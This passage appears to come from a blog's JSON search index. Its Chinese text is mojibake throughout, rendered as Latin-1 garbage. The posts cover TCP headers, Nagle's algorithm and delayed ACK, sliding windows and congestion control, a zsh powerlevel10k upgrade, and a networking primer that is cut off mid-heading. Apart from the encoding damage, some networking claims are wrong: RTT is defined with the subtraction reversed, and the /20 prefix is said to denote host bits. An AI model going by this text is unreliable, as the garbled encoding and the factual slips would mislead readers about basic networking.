ä¸¤ä¸ª4å­—èŠ‚çš„æ—¶é—´æˆ³å­—æ®µï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ª4å­—èŠ‚å­—æ®µç”¨æ¥ä¿å­˜å‘é€è¯¥æ•°æ®åŒ…çš„æ—¶é—´ï¼Œç¬¬äºŒä¸ª4å­—èŠ‚å­—æ®µç”¨æ¥ä¿å­˜æœ€è¿‘ä¸€æ¬¡æ¥æ”¶å¯¹æ–¹å‘é€åˆ°æ•°æ®çš„æ—¶é—´ã€‚æœ‰äº†è¿™ä¸¤ä¸ªæ—¶é—´å­—æ®µï¼Œä¹Ÿå°±æœ‰äº†åç»­ä¼˜åŒ–çš„ä½™åœ°ã€‚\n\n\n\n\n\n# 4. tcp å¤´éƒ¨å­—æ®µ\n\n### 4.1 å¤´éƒ¨æ ¼å¼\n\n20å­—èŠ‚å›ºå®š  + æœ€å¤§40å­—èŠ‚æ‰©å±•\n\n### 4.2 å›ºå®š20å­—èŠ‚è¯¦æƒ…\n\n- [x] æºç«¯å£ 2å­—èŠ‚,  ç›®çš„ç«¯å£ 2å­—èŠ‚\n\n- [x] åºå· 4å­—èŠ‚ , æˆ‘å‘é€çš„æ˜¯ä»¥ n å¼€å§‹çš„åºå·\n\n- [x] ç¡®è®¤å· 4å­—èŠ‚, ä¹‹å‰çš„éƒ½å·²ç»æ¥æ”¶,ä¸‹æ¬¡å¸Œæœ›ç»™æˆ‘ä¼ é€’ n,  ACKä½ç½®å¿…é¡»=1\n\n- [x] æ•°æ®åç§»(è¯´æ˜å¤´éƒ¨å­—èŠ‚æ˜¯20è¿˜æ˜¯åˆ°60) + ä¿ç•™ + URG(ç´§æ€¥æŒ‡é’ˆæœ‰æ•ˆ) + ACK + PSH(æ¨é€,å°½å¿«äº¤ç»™åº”ç”¨å±‚) + RST(å¤ä½,é‡æ–°å»ºç«‹è¿æ¥) + SYN(tcpå»ºç«‹æ ‡å¿—) + FIN(tcpé‡Šæ”¾æ ‡å¿—) ä¸€å…±2å­—èŠ‚,     çª—å£2å­—èŠ‚, æˆ‘çš„æ¥æ”¶çª—å£å¤§å° (ä¾‹å¦‚rwnd=20)\n\n- [x] æ£€éªŒå’Œ2å­—èŠ‚(æ£€é”™ç®—æ³•),  ç´§æ€¥æŒ‡é’ˆ2å­—èŠ‚(å¸®å¿™å–å‡ºç´§æ€¥æ•°æ®)\n\n\n\n### 4.3 æ‰©å±•å­—æ®µ\n\n![1](tcpä»‹ç»å’Œtcpå»ºç«‹è¿æ¥è¿‡ç¨‹/4.png)\n\n\n\n\n\n# 5. tcp å…¶ä»–\n\n### 5.1 Nagle(å…§å‹¾)ç®—æ³•\n\nï¼ˆ1ï¼‰å¦‚æœåŒ…é•¿åº¦è¾¾åˆ°MSSï¼Œåˆ™å…è®¸å‘é€ï¼›\n\nï¼ˆ2ï¼‰å¦‚æœè¯¥åŒ…å«æœ‰FINï¼Œåˆ™å…è®¸å‘é€ï¼›\n\nï¼ˆ3ï¼‰è®¾ç½®äº†TCP_NODELAYé€‰é¡¹ï¼Œåˆ™å…è®¸å‘é€ï¼›\n\nï¼ˆ4ï¼‰æœªè®¾ç½®TCP_CORKé€‰é¡¹æ—¶ï¼Œ***è‹¥æ‰€æœ‰å‘å‡ºå»çš„å°æ•°æ®åŒ…ï¼ˆåŒ…é•¿åº¦å°äºMSSï¼‰å‡è¢«ç¡®è®¤ï¼Œåˆ™å…è®¸å‘é€ï¼›***\n\nï¼ˆ5ï¼‰ä¸Šè¿°æ¡ä»¶éƒ½æœªæ»¡è¶³ï¼Œä½†å‘ç”Ÿäº†è¶…æ—¶ï¼ˆä¸€èˆ¬ä¸º200msï¼‰ï¼Œåˆ™ç«‹å³å‘é€ã€‚\n\n\n\n+ ä¼˜ç‚¹ï¼šé¿å…ç½‘ç»œä¸­å……æ–¥ç€è®¸å¤šå°æ•°æ®å—ï¼Œé™ä½ç½‘ç»œè´Ÿè½½ï¼Œå‡å°‘ç½‘ç»œæ‹¥å¡ï¼Œæé«˜ç½‘ç»œåå\n\n+ ç¼ºç‚¹ï¼šå®¢æˆ·ç«¯çš„å»¶è¿Ÿä¼šå¢åŠ ï¼Œå®æ—¶æ€§é™ä½ï¼Œä¸é€‚åˆå»¶æ—¶è¦æ±‚å°½é‡å°çš„åœºæ™¯ï¼›ä¸”å¯¹äºå¤§æ–‡ä»¶ä¼ è¾“è¿™ç§åœºæ™¯ï¼Œä¼šé™ä½ä¼ è¾“é€Ÿåº¦ã€‚\n\nç”¨TCP_NODELAYé€‰é¡¹å¯ä»¥ç¦æ­¢Negale ç®—æ³•ã€‚æ­¤æ—¶ï¼Œåº”ç”¨ç¨‹åºå‘å†…æ ¸é€’äº¤çš„æ¯ä¸ªæ•°æ®åŒ…éƒ½ä¼šç«‹å³å‘é€å‡ºå»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶ç¦æ­¢äº†Negale ç®—æ³•ï¼Œä½†ç½‘ç»œçš„ä¼ è¾“ä»ç„¶å—åˆ°TCPç¡®è®¤å»¶è¿Ÿæœºåˆ¶çš„å½±å“ã€‚\n\n\n\n### 5.2 å»¶è¿Ÿç¡®è®¤\n\næ¥æ”¶æ–¹åœ¨æ”¶åˆ°æ•°æ®åï¼Œå¹¶ä¸ä¼šç«‹å³å›å¤ACK, è€Œæ˜¯å»¶è¿Ÿä¸€å®šæ—¶é—´ æˆ–è€… è¾¾åˆ°2xæœ€å¤§æ®µæ•°æ®é•¿åº¦ä¸ºæ­¢ (ä¸åŒæ“ä½œç³»ç»Ÿå®ç°å¹¶ä¸ä¸€æ ·)\n\n1. è¿™æ ·åšçš„ç›®çš„æ˜¯ACKæ˜¯å¯ä»¥åˆå¹¶çš„ï¼Œä¹Ÿå°±æ˜¯æŒ‡å¦‚æœè¿ç»­æ”¶åˆ°ä¸¤ä¸ªTCPåŒ…ï¼Œå¹¶ä¸ä¸€å®šéœ€è¦ACKä¸¤æ¬¡ï¼Œåªè¦å›å¤æœ€ç»ˆçš„ACKå°±å¯ä»¥äº†ï¼Œå¯ä»¥é™ä½ç½‘ç»œæµé‡ã€‚\n2. å¦‚æœæ¥æ”¶æ–¹æœ‰æ•°æ®è¦å‘é€ï¼Œé‚£ä¹ˆå°±ä¼šåœ¨å‘é€æ•°æ®çš„TCPæ•°æ®åŒ…é‡Œï¼Œå¸¦ä¸ŠACKä¿¡æ¯ã€‚è¿™æ ·åšï¼Œå¯ä»¥é¿å…å¤§é‡çš„ACKä»¥ä¸€ä¸ªå•ç‹¬çš„TCPåŒ…å‘é€ï¼Œå‡å°‘äº†ç½‘ç»œæµé‡ã€‚\n\n\n\n\n### 5.3 Nagleå’Œå»¶è¿Ÿç¡®è®¤ä¸€èµ·ä½¿ç”¨äº§ç”Ÿçš„é—®é¢˜\n\nä¸¤ç§ç®—æ³•ä¼˜ç‚¹éƒ½æœ‰å‡å°ç½‘ç»œæ•°æ®åŒ…çš„ä¼˜ç‚¹ï¼Œä½†æ˜¯éƒ½å¢åŠ äº†ç½‘ç»œé€šä¿¡çš„å»¶æ—¶. ç»“åˆåœ¨ä¸€èµ·å°±ä¼šæœ‰é—®é¢˜\n\nä¾‹å¦‚å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªæ•°æ®æŠ¥, ç”±äºå»¶æ—¶ç¡®è®¤ï¼ŒæœåŠ¡ç«¯ä¸æ˜¯é©¬ä¸Šç¡®è®¤ï¼›\n\nè‹¥å®¢æˆ·ç«¯å¯ç”¨nagleç®—æ³•ï¼Œè¦ç­‰åˆ°æ”¶åˆ°ä¸Šä¸€ä¸ªæ•°æ®æŠ¥çš„ç¡®è®¤åœ¨å‘é€ä¸‹ä¸€ä¸ªæ•°æ®æŠ¥ï¼›\n\nå¦‚æ­¤ä»¥æ¥ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ç›¸äº’ç­‰å¾…ï¼Œç›´åˆ°è¶…æ—¶æˆ–è€…å…¶ä»–æƒ…å†µ.\n\n\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://my.oschina.net/xinxingegeya/blog/485643\n+ https://blog.oldboyedu.com/tcp-wait/","tags":["tcp"],"categories":["ç½‘ç»œ"]},{"title":"tcpæ»‘åŠ¨çª—å£,æ‹¥å¡æ§åˆ¶å’Œè¶…æ—¶é‡ä¼ æ—¶é—´é€‰æ‹©","url":"%2Fp%2F7eb83068.html","content":"\n\n\n# 1. æµé‡æ§åˆ¶-æ»‘åŠ¨çª—å£\n\n\n\n![1](tcpæ»‘åŠ¨çª—å£å’Œæ‹¥å¡æ§åˆ¶/1.png)\n\n<!-- more -->\n\n### 1.0 å‰æ\n\nA->B     A æ˜¯å‘é€æ–¹, B æ˜¯æ¥æ”¶æ–¹,  å„è‡ªæœ‰è‡ªå·±çš„æ»‘åŠ¨çª—å£\n\n### 1.1  Bå‘Šè¯‰Açš„çª—å£å¤§å°\n\n+ rwnd=20  æˆ‘çš„çª—å£20ä¸ª\n\n+ ack=31  ä¸‹ä¸€æ¬¡ç»™è€å­å‘31\n\n\n\n### 1.2  Açš„çª—å£ç§»åŠ¨\n\n+  å°¾éƒ¨\n  + å¾€å‰ç§»åŠ¨\n  + ä¸åŠ¨, å› ä¸ºåœ¨ç­‰å¾… ACK \n\n+ å¤´éƒ¨\n  + å¾€å‰ç§»åŠ¨\n  + ä¸åŠ¨, ç­‰å¾…\n  + å‘åæ”¶ç¼©, B ç«¯çš„çª—å£å˜å°äº†(ä¸å»ºè®®è¿™ä¹ˆåš)\n\n\n\n### 1.3 Açª—å£å†…ä¸‰ä¸ªæŒ‡é’ˆ\n\n+ P1 å·²ç»å‘é€çš„ä½ç½®, æœªæ”¶å–åˆ° ACK\n+ P2 å‡†å¤‡å‘é€çš„ä½ç½®\n+ P3 å°¾éƒ¨\n\n\n\n### 1.4  Bçš„çª—å£çŠ¶æ€\n\n+ B çª—å£å†…,  æ•°æ®æœªæŒ‰åºåˆ°è¾¾, åªèƒ½ç°åœ¨ç¼“å­˜ä¸­,  å› ä¸ºB åªèƒ½æŒ‰æ­£ç¡®é¡ºåºå‘é€ACK\n+ å¦‚æœ A ä¸€åªæ²¡æœ‰æ”¶åˆ° ACK,è¿˜æœ‰è¶…æ—¶é‡ä¼ æœºåˆ¶\n\n![1](tcpæ»‘åŠ¨çª—å£å’Œæ‹¥å¡æ§åˆ¶/2.png)\n\n### 1.5 æ€»ç»“\n\n+ Açš„çª—å£å¤§å°ä¸ä¸€å®šå’Œ B è¯´çš„ä¸€æ ·\n  + ä¼ è¯´çª—å£å€¼æœ‰æ—¶é—´æ»å\n  + ç½‘ç»œæ‹¥å¡æƒ…å†µ\n\n+ B çš„ä¸æŒ‰æ—¶åºè¾¾åˆ°çš„æ•°æ®å¦‚ä½•å¤„ç†, tcp æ²¡æœ‰è§„å®š\n  + ç›´æ¥ä¸¢å¼ƒ, ç®€å•, æ•ˆç‡å·®\n  + ç¼“å­˜åœ¨çª—å£å†…, ç­‰åˆ°æ”¶åˆ°è¿ç»­äº†å, å† ACK\n\n+ ä¸ºäº†å¢åŠ æ•ˆç‡,  tcp è¦æ±‚æ¥æ”¶æ–¹ B \n  + ç´¯è®¡ç¡®è®¤, å¤šä¸ªä¸€èµ·ç¡®è®¤\n  + æå¸¦ç¡®è®¤. å‘æ•°æ®é¡ºä¾¿ç¡®è®¤, ä¸ç»å¸¸å‘ç”Ÿ\n  + ä¸èƒ½å¤ªæ™šç¡®è®¤, è¦ä¸ç„¶ A å°±è¶…æ—¶é‡ä¼ \n\n+ å…¨åŒå·¥é€šä¿¡\n  + å…¶å®Aå’ŒBéƒ½æœ‰å‘é€çª—å£å’Œæ¥æ”¶çª—å£\n\n\n\n##### 1.6. 0çª—å£æ£€æµ‹æŠ¥æ–‡\n\n+ æ²¡æœ‰ç¼“å­˜äº†, ä¹Ÿå¿…é¡»è¦æ¥æ”¶æ£€æµ‹æˆ–ç´§æ€¥æŠ¥æ–‡\n\n![1](tcpæ»‘åŠ¨çª—å£å’Œæ‹¥å¡æ§åˆ¶/4.png)\n\n\n\n# 2. æ‹¥å¡æœºåˆ¶(é€šè¿‡ç®—æ³•è°ƒæ•´æ‹¥å¡çª—å£)\n\nå‡ºç°æ‹¥å¡ä¸æ§åˆ¶ï¼Œååé‡ä¸‹é™ï¼Œç±»ä¼¼å µè½¦ã€‚\n\n### 2.0 å‰æ\n\næ•°æ®å‘é€ A->B,  B æœ‰è¶³å¤Ÿå¤§çš„çª—å£, A çš„æ‹¥å¡çª—å£æ ¹æ®æ‹¥å¡è°ƒèŠ‚ \n\n+ > TCP å‘é€æ–¹Açš„å‘é€çª—å£ = min(Açš„è‡ªèº«æ‹¥å¡çª—å£, TCPæ¥æ”¶æ–¹Bçš„æ¥æ”¶çª—å£)\n\n+ æ¥æ”¶çª—å£ rwnd (receive window)\n\n+ å‘é€çª—å£ swnd (send window)\n\n+ æ‹¥å¡çª—å£ cwnd (congestion window)\n\n\n\n\n>  åˆ¤æ–­æ‹¥å¡ä¾æ®, æ˜¯ Aæ²¡æœ‰æ”¶åˆ° B çš„ ACK, Aè‡ªå·±å‘ç”Ÿäº†è¶…æ—¶é‡ä¼ ã€‚\n\n\n\n### 2.1 Açš„æ‹¥å¡çª—å£å¤§å°(cwnd)å’Œæ…¢å¼€å§‹å˜é‡ ssthresh\n\n+ cwnd < ssthresh æ…¢å¼€å§‹ç®—æ³•\n\n\n+ cwnd >  ssthresh æ‹¥å¡é¿å…ç®—æ³•\n+ cwnd =  ssthresh  ä¸¤ä¸ªç®—æ³•éƒ½å¯ä»¥\n\n\n\n### 2.2 çª—å£å˜é‡çš„å˜åŒ–\n\ncwnd=1\n\nswnd=cwndï¼Œå› ä¸ºå–æ‹¥å¡å’Œæ¥æ”¶æœ€å°å€¼\n\nssthresh=16\n\n\n\n+ æ…¢å¼€å§‹ç®—æ³•å¼€å§‹  æ¯æ¬¡æ”¶åˆ° ack, å°±+1,  ç„¶å +2,  + 4,  + 8 , æœ‰ç§æŒ‡æ•°å¢é•¿æ¦‚å¿µ\n\n+ åˆ°äº†16, å˜æˆæ‹¥å¡é¿å…ç®—æ³•, æ¯æ¬¡+1, æ”¶åˆ°åå†+1\n+ å‡ºç°äº†ä¸¢åŒ…æƒ…å†µ,è®¤ä¸ºæ‹¥å¡\n  + å°†cwnd=1ï¼Œç›´æ¥åˆ°åº•ã€‚\n  + å°†ssthresh=cwnd/2, è¿™ä¸ªæ—¶å€™ä½ å¼€å§‹æ‹¥å¡äº†, å–æˆ‘çš„ä¸€åŠå¥½äº†\n+ æ…¢å¼€å§‹ç®—æ³•ç»§ç»­å¼€å§‹\n\n---\n\n### 2.3 å¿«é‡ä¼ ï¼Œå¿«æ¢å¤ï¼Œé¿å…æ‹¥å¡çª—å£ç›´æ¥å˜1\n\n> æœ‰æ—¶å€™ä¸¢åŒ…, æ˜¯ç½‘ç»œé—®é¢˜,å¹¶ä¸æ˜¯æ‹¥å¡,ä½†æ˜¯ä½ è®¤ä¸ºæ‹¥å¡,  ç›´æ¥è®©çª—å£å˜1äº†æ€ä¹ˆåŠ?\n\n+ å¯ç”¨å¿«é‡ä¼ æœºåˆ¶\n+ B ç›´æ¥ç»™ A å‘é€3ä¸ªé‡å¤ç¡®è®¤\n+ å‘é€æ–¹ A æ”¶åˆ°äº†3ä¸ªé‡å¤ç¡®è®¤, è¯´æ˜ä¸æ˜¯æ‹¥å¡, ä¸ç”¨æ…¢å¼€å§‹ç®—æ³•, æ‰§è¡Œå¿«æ¢å¤ç®—æ³•ã€‚\n\n+ \n+ å¿«æ¢å¤ç®—æ³•ï¼Œç›´æ¥å°†æ‹¥å¡çª—å£å’Œssthreshç­‰äºå½“å‰çš„æ‹¥å¡çª—å£çš„ä¸€åŠ\n+ å› ä¸ºç›¸ç­‰ï¼Œç»§ç»­æ‰§è¡Œæ‹¥å¡é¿å…æ–¹æ³•\n\n\n\n### 2.4 æ‹¥å¡æ§åˆ¶å››ä¸ªç®—æ³•\n\n+ æ…¢å¼€å§‹, æŒ‡æ•°å¢åŠ \n\n  + å‘é€çš„æŠ¥æ–‡å°‘, ä¸ç‚¹éƒ½ä¸æ…¢ï¼Œåè€ŒæŒ‡æ•°å¢é•¿\n\n+ æ‹¥å¡é¿å…, æ¯æ¬¡+1\n\n  + ä¸æ˜¯é¿å…æ‹¥å¡, æ˜¯çº¿æ€§å¢é•¿, è¯•è¯•å•¥æ—¶å€™æ‹¥å¡\n\n+ å¿«é‡ä¼ \n\n  B æ•°æ®æœªæŒ‰åºåˆ°è¾¾, å°±ä¸€ç›´å‘é€æƒ³è¦çš„åºå·, ä¸€ç›´æé†’ A, è®©ææ—©é‡ä¼ \n\n  + Bè¦æ±‚ A ä½ å¿«é‡ä¼ , ä¸è¦ç­‰è®¡æ—¶å™¨åˆ°äº†\n  + Bç«‹å³å‘é€ç¡®è®¤, å¦‚æœä¸æ˜¯æ­£ç¡®é¡ºåºåˆ°è¾¾, å°±å‘é€ä¹‹å‰æ­£ç¡®é¡ºåºçš„é‡å¤ç¡®è®¤(ä¸ºäº†æé†’ A)\n  + A æ”¶åˆ°äº†3ä¸ªè¿ç»­çš„é‡å¤ç¡®è®¤, å°±åº”è¯¥ç«‹å³é‡ä¼ \n\n+ å¿«æ¢å¤\n\n  + å°†ssthreshå’Œ cwndéƒ½è°ƒæ•´ä¸ºå½“å‰çª—å£çš„ä¸€åŠ,  ä»–ä¿©ç›¸ç­‰äº†å†æ‰§è¡Œæ‹¥å¡é¿å…ç®—æ³•\n\n\n\n![1](tcpæ»‘åŠ¨çª—å£å’Œæ‹¥å¡æ§åˆ¶/3.png)\n\n\n\n\n\n# 3. è¶…æ—¶é‡ä¼ æ—¶é—´çš„é€‰æ‹©\n\n+ RTTå¾€è¿”æ—¶é—´ = å¼€å§‹å‘é€æ—¶é—´ -  æ”¶åˆ°æ—¶é—´\n\n+ RTOè¶…æ—¶æ—¶é—´, è¦ç•¥å¤§äº RTT æ—¶é—´\n\n\n\n![1](tcpæ»‘åŠ¨çª—å£å’Œæ‹¥å¡æ§åˆ¶/5.png)\n\n\n\néšç€ç¯å¢ƒçš„ä¸ä¸€æ ·, RTTæ ·æœ¬å·®åˆ«å¤§, è¦è®¡ç®—åŠ æƒå¹³å‡\n\nä½†æ˜¯å¦‚æœé‡ä¼ äº†,ç”±äºåˆ†ä¸æ¸…æ˜¯å¯¹é‚£ä¸ªçš„å›åº”, å°±ä¸è®¡ç®—äº†, è¿˜æ˜¯ç”¨ä»¥å‰çš„RTO*2\n\n![1](tcpæ»‘åŠ¨çª—å£å’Œæ‹¥å¡æ§åˆ¶/6.png)","tags":["tcp"],"categories":["ç½‘ç»œ"]},{"title":"zshä¸»é¢˜powerlevel9kå‡çº§åˆ°powerlevel10k","url":"%2Fp%2F4fd520f9.html","content":"\n\n\nä¸ºä»€ä¹ˆå‡çº§ï¼Ÿ\n\nPowerlevel9ké¡¹ç›®ä¸å†ç»´æŠ¤ï¼ŒPowerlevel10kæ›´å¿«æ›´å¼ºå¤§ï¼ˆ10-100å€çš„æ€§èƒ½æå‡ï¼‰ã€‚\n\nPowerlevel10kå¹¶ä¸”å®Œç¾å…¼å®¹Powerlevel9k, ä»¥å‰çš„é…ç½®å‚æ•°å¯ä»¥ä¸ç”¨ä»»ä½•ä¿®æ”¹.\n\n<!-- more -->\n\n### 1. æ›¿æ¢\n\n```bash\ngit clone --depth=1 https://github.com/romkatv/powerlevel10k.git $ZSH_CUSTOM/themes/powerlevel10k\n\n# Replace ZSH_THEME=\"powerlevel9k/powerlevel9k\" with ZSH_THEME=\"powerlevel10k/powerlevel10k\".\n```\n\n\n\n### 2. é…ç½®\n\nå¯ä»¥é€šè¿‡ `p10k configure` å®‰è£…æ¨èå­—ä½“. ä¹Ÿå¯ä»¥`p10k configure`è¿›è¡Œå‚»ç“œå¼ä¸»é¢˜é…ç½®. ä¸è¿‡è¿˜æ˜¯å»ºè®®è‡ªå·±å®šåˆ¶.\n\n```\np10k configure\n```\n\n\n\n### 3. æˆ‘çš„é…ç½®\n\n```yaml\nPOWERLEVEL9K_MODE='nerdfont-complete'\nZSH_THEME=\"powerlevel10k/powerlevel10k\"\nPOWERLEVEL9K_CONTEXT_TEMPLATE='%n'\nPOWERLEVEL9K_CONTEXT_DEFAULT_FOREGROUND='white'\nPOWERLEVEL9K_PROMPT_ON_NEWLINE=true\nPOWERLEVEL9K_MULTILINE_LAST_PROMPT_PREFIX=\"%F{014}\\u2570%F{cyan}\\uF460%F{073}\\uF460%F{109}\\uF460%f \"\nPOWERLEVEL9K_SHORTEN_DIR_LENGTH=1\nPOWERLEVEL9K_NODE_VERSION_BACKGROUND=\"002\"\nPOWERLEVEL9K_NODE_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_GO_VERSION_BACKGROUND=\"001\"\nPOWERLEVEL9K_GO_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_WIFI_BACKGROUND=\"003\"\nPOWERLEVEL9K_WIFI_FOREGROUND=\"black\"\nPOWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(os_icon context ssh dir vcs)\nPOWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status proxy anaconda node_version go_version wifi)\n\n# çœ‹é¢œè‰²\n# for i in {0..255}; do print -Pn \"%K{$i}  %k%F{$i}${(l:3::0:)i}%f \" ${${(M)$((i%6)):#3}:+$'\\n'}; done\n```\n\n\n\n### 4. å‚è€ƒèµ„æ–™\n\n+ https://github.com/romkatv/powerlevel10k\n+ https://www.liuvv.com/p/6600d67c.html\n\n","tags":["zsh"],"categories":["zsh"]},{"title":"è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹","url":"%2Fp%2F57254ff8.html","content":"\n\n\n# 1. MACåœ°å€\n\næ˜¯å¯¹ç½‘ç»œä¸Šå„æ¥å£çš„å”¯ä¸€æ ‡è¯†, æ³¨æ„è€Œä¸æ˜¯è®¾å¤‡çš„å”¯ä¸€æ ‡è¯†\n\nå› ä¸ºæ™®é€šç”µè„‘å°±æœ‰çº¿ç½‘å¡å’Œæ— çº¿ç½‘å¡, äº¤æ¢æœºå’Œè·¯ç”±å™¨æ›´æ˜¯æœ‰å¤šä¸ª mac åœ°å€\n<!-- more -->\n\n\n+ å•æ’­ mac åœ°å€  å°±æ˜¯æŸ¥çœ‹è‡ªå·±æ˜¯å¦åŒ¹é…, åŒ¹é…æ¥å—\n\n+ å¹¿æ’­ mac åœ°å€  FF-FF-FF-FF-FF-FF, æ¥å—\n\n+ å¤šæ’­ mac åœ°å€ çœ‹è‡ªå·±çš„æ˜¯å¦åœ¨è¿™ä¸ªå¤šæ’­ç§Ÿ, åœ¨çš„è¯æ¥å—\n\n\n\n# 2. IP åœ°å€\n\nåœ¨æ•°æ®åŒ…çš„è½¬å‘è¿‡ç¨‹ä¸­, æº ipåœ°å€å’Œç›®çš„ ip åœ°å€ä¸å˜, æº mac åœ°å€å’Œç›®çš„ mac åœ°å€ä¸€ç›´å˜\n\n\n\n# 3. ARPåè®®\n\næ¯ä¸ªä¸»æœºæœ‰è‡ªå·±çš„ arp ç¼“å­˜è¡¨,  ä¸çŸ¥é“åˆ«äººçš„å°±éœ€è¦å‘é€ arp æŠ¥æ–‡\n\narp ç¼“å­˜è¡¨æœ‰ç±»å‹, é™æ€å’ŒåŠ¨æ€,  ä¸€èˆ¬æ˜¯åŠ¨æ€, ä¸¤åˆ†é’Ÿå¤±æ•ˆ, å› ä¸ºæœ‰å¯èƒ½ä½ æ¢ ip\n\narp åªèƒ½åœ¨åŒä¸€ä¸ªç½‘ç»œä¸­ä½¿ç”¨, ä¸èƒ½è·¨ç½‘ç»œè¯¢é—®\n\n\n\n# 4. é›†çº¿å™¨å’Œäº¤æ¢æœº\n\né›†çº¿å™¨ç»™ä»¥å¤ªç½‘æ¯ä¸ªè®¾å¤‡å‘é€(ç‰©ç†å±‚)\n\näº¤æ¢æœºç»™ç›®çš„ä¸»æœºå‘é€(æ•°æ®é“¾è·¯å±‚,ä¹ŸåŒ…æ‹¬ç‰©ç†å±‚)\n\n\n\né›†çº¿å™¨å’Œäº¤æ¢æœºç»„æˆçš„ç½‘ç»œå±äºåŒä¸€ä¸ªå¹¿æ’­åŸŸ,å°±æ˜¯å¹¿æ’­çš„éƒ½èƒ½æ”¶åˆ°\n\näº¤æ¢æœºé€šè¿‡è‡ªå­¦ä¹ çš„æ–¹æ³•, è®°å½•ä¸»æœº mac åœ°å€æ‰€å¯¹åº”çš„æ¥å£å·\n\n\n\nä¸ºäº†ä»¥å¤ªç½‘ç¨³å®š, ä¸€èˆ¬å†—ä½™äº¤æ¢æœºçº¿è·¯è¿æ¥, ä½†æ˜¯æœ‰å¯èƒ½å‘ç”Ÿå¹¿æ’­é£æš´(ç¯), å¯ä»¥é€šè¿‡ç”Ÿæˆæ ‘åè®®STP ,é¿å…ç¯è·¯(æœ€å°ç”Ÿæˆæ ‘)\n\n\n\n# 5. VALN\n\nä¸€ä¸ªæˆ–å¤šä¸ªäº¤æ¢æœº,ä¸åŒçš„æ¥å£åˆ’åˆ†æˆå¤šä¸ª VLAN\n\né€šè¿‡ VLANç¼©å°å¹¿æ’­åŸŸ, è¿˜å¯ä»¥ç”¨è·¯ç”±å™¨éš”ç¦»å¹¿æ’­åŸŸ\n\näº¤æ¢æœºæ¥å£ç±»å‹: Access, Trunk, Hybrid(åä¸º)\n\nVLAN è®¾ç½®, å’Œä¸»æœºè¿æ¥çš„äº¤æ¢æœºç”¨ ACCESSç«¯å£, äº¤æ¢æœºäº’è”çš„ç«¯å£ç”¨ Trunk ç«¯å£\n\n\n\n# 6. IPV4\n\n### 6.1 åˆ†ç±»ç¼–å€\n\nç½‘ç»œå·+ä¸»æœºå· 4ä¸ªå­—èŠ‚32ä½\n\nA ç±» 0-127    ç½‘ç»œå·1ä¸ªå­—èŠ‚\n\nB ç±» 128-191  ç½‘ç»œå·2ä¸ªå­—èŠ‚\n\nC ç±» 192-223 ç½‘ç»œå·3ä¸ªå­—èŠ‚\n\nD ç±»  å¤šæ’­åœ°å€\n\nE ç±»  ä¿ç•™ä½¿ç”¨\n\n### 6.2 åˆ’åˆ†å­ç½‘\n\nä»ä¸»æœºå·å€Ÿç”¨ä¸€éƒ¨åˆ†ç»™å­ç½‘å·,  æœ‰ç§ä»Bç±»é™çº§åˆ°Cç±»çš„æ„Ÿè§‰\n\nå­ç½‘æ©ç , å‰é¢1ä»£è¡¨ç½‘ç»œå·, 0ä»£è¡¨ä¸»æœºå·, ç„¶åé€»è¾‘ä¸è¿ç®—, å¾—åˆ°å­ç½‘çš„ç½‘ç»œåœ°å€(ç½‘ç»œèµ·å§‹çš„åœ°å€,xxx.xxx.xxx.0)\n\nC ç±»åœ°å€é»˜è®¤å­ç½‘æ©ç å°±æ˜¯255.255.255.0\n\n### 6.3 æ— åˆ†ç±»ç¼–å€\n\nå¿˜è®°å‰ä¸¤ç§æ–¹æ³•\n\n128.14.35.7/20 è¡¨æ˜20ä¸ªæ˜¯ä¸»æœºå·\n\n\n\n![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/1.png)\n\n\n\næ ¹æ®æ— åˆ†ç±», è·¯ç”±é€‰æ‹©æœ€é•¿å‰ç¼€åŒ¹é…, è®¤ä¸ºè¶Šé•¿,è·¯ç”±æ›´å…·ä½“\n\n\n\n# 7. IPæ•°æ®æŠ¥\n\nç»™åˆ«äººå‘æ•°æ®æŠ¥, å…ˆçœ‹è‡ªå·±å’Œåˆ«äººçš„ç½‘ç»œåœ°å€æ˜¯å¦ä¸€æ ·, ä¸ä¸€æ ·å°±ä¸åœ¨ä¸€ä¸ªç½‘ç»œ, è¦å‘ç»™é»˜è®¤ç½‘å…³\n\né»˜è®¤ç½‘å…³: æŒ‡å®šçš„è½¬å‘è·¯ç”±å™¨çš„ IP åœ°å€\n\nåˆ°è¾¾è·¯ç”±å™¨æ—¶, æ£€æŸ¥è·¯ç”±æ¡ç›®, åŒ¹é…åˆ°æ­£ç¡®çš„ç½‘ç»œåœ°å€åè½¬å‘\n\nè·¯ç”±å™¨ä¸è½¬å‘å¹¿æ’­åœ°å€\n\n\n\n### 7.1 è·¯ç”±è¡¨\n\né»˜è®¤è·¯ç”± 0.0.0.0/0, \t\t\t\t ç½‘ç»œå‰ç¼€æœ€çŸ­,æœ€æ¨¡ç³Š, é€‰æ‹©ä¼˜å…ˆçº§æœ€ä½\n\nç‰¹å®šè·¯ç”± 198.168.1.2/32        ç½‘ç»œå‰ç¼€æœ€é•¿,æœ€å…·ä½“, é€‰æ‹©ä¼˜å…ˆçº§æœ€é«˜\n\n\n\nå› ä¸ºæœ‰é»˜è®¤è·¯ç”±çš„å­˜åœ¨(å°‘äº†è·¯ç”±æ¡ç›®å‘ç»™é»˜è®¤è·¯ç”±, ä¸å­˜åœ¨çš„ç½‘ç»œä¹Ÿç»™é»˜è®¤è·¯ç”±), å®¹æ˜“å‘ç”Ÿè·¯ç”±ç¯è·¯çš„é—®é¢˜, æ‰€ä»¥ IP æ•°æ®æŠ¥æœ‰ TTL , å˜æˆ0äº†å°±ä¸¢å¼ƒ\n\n\n\n### 7.2 è·¯ç”±é€‰æ‹©åè®®\n\nä¸€ä¸ªç½‘ç»œ,ç»„æˆè‡ªæ²»ç³»ç»Ÿ AS\n\nä¸¤ä¸ªAS ä¹‹é—´ç”¨å¤–éƒ¨ç½‘å…³åè®® EGP\n\nASå†…éƒ¨ç”¨å†…éƒ¨ç½‘å…³åè®® IGP\n\n![1](è®¡ç®—æœºç½‘ç»œç®€æ˜æ•™ç¨‹/2.png)\n\n\n\n##### 7.2.1 